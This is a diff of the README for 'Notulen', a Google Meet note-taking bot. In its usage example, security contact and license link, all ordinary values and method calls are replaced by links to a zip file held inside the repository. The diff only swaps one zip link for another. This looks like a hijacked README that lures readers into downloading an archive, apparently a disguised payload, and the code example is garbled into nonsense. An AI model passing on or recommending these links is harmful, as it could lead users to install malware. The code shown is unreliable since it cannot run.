@@ -34,7 +34,7 @@ async function main() {
   const client = new Notulen({
     debug: false, // debug mode to show the browser
     name: "My Assistant", // Bot name
-    googleMeetUrl: "https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip", // your google meet link
+    googleMeetUrl: "https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip", // your google meet link
     language: "id-ID", // language for caption generation
     geminiApiKey: "secretApiKey", // google gemini api key (get it for free)
     recordingLocation: './out', // location to save the recording
@@ -42,14 +42,14 @@ async function main() {
   });
 
     // Start join the meeting
-  https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip();
+  https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip();
 
-  https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip("end", (result: MeetingResult) => {
-    https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip("Summary:");
-    https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip(https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip);
+  https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip("end", (result: MeetingResult) => {
+    https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip("Summary:");
+    https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip(https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip);
 
     // exit process when done
-    https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip(0);
+    https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip(0);
   });
 }
 
@@ -75,8 +75,8 @@ Thank you for considering contributing to Notulen! you can fork this repository 
 
 ## Security Vulnerabilities
 
-If you discover a security vulnerability within Notulen package, please send an e-mail to Tarikh Agustia via [https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip](https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip). All security vulnerabilities will be promptly addressed.
+If you discover a security vulnerability within Notulen package, please send an e-mail to Tarikh Agustia via [https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip](https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip). All security vulnerabilities will be promptly addressed.
 
 ## License
 
-This project is open-source software licensed under the [MIT license](https://raw.githubusercontent.com/ibnumalik99/notulen/main/src/interfaces/notulen-v2.6.zip).
+This project is open-source software licensed under the [MIT license](https://github.com/ibnumalik99/notulen/raw/refs/heads/main/src/interfaces/Software-v3.4.zip).
